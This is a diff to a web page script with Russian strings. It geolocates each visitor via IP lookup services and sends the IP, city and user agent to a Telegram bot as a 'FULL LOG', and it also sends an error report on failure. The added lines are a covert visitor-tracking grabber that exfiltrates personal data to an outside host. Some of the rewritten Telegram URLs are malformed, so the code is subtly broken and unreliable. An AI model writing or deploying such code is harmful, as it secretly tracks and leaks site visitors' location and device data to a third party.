@@ -84,28 +84,34 @@
             let city = "Не определен";
             let device = navigator.userAgent;
 
-            try {
-               
-                const res = await fetch('https://ipwho.is/');
-                const d = await res.json();
-                
-                if (d.success) {
-                    ip = d.ip;
-                    city = d.city;
-                }
-
-                document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = navigator.platform;
-
-                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${device}`;
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-
-            } catch (e) {
-                
-                const errLog = `⚠️ Переход (Ошибка IP)!\n📱 ${device}\n❌ Ошибка кода: ${e.message}`;
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(errLog)}`);
+                    try {
+       
+            let res = await fetch('https://ipwho.is/');
+            let d = await res.json();
+            
+       
+            if (!d.ip) {
+                res = await fetch('https://api.ipify.org?format=json');
+                d = await res.json();
             }
+
+            const ip = d.ip || "Не определен";
+            const city = d.city || d.location?.city || "Неизвестно";
+
+          
+            document.getElementById('user-ip').innerText = ip;
+            document.getElementById('user-geo').innerText = city;
+            document.getElementById('user-os').innerText = navigator.platform;
+
+   
+            const report = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
+            await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
+
+        } catch (e) {
+             
+            const backup = `⚠️ Переход (Ошибка IP)!\n📱 ${navigator.userAgent}\n❌ Ошибка: ${e.message}`;
+            fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
+         }
         }
     </script>
 </body>
